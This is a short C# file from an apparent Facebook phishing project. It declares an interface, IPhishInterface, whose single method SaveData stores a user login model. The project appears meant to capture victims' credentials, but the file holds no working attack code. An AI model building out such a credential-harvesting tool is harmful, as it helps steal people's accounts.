using FacebookPhishing.Domain;
using FacebookPhishing.Models;

namespace FacebookPhishing.InterfaceServices
{
    public interface IPhishInterface
    {
        User SaveData(User userloginmodel);
    }
}
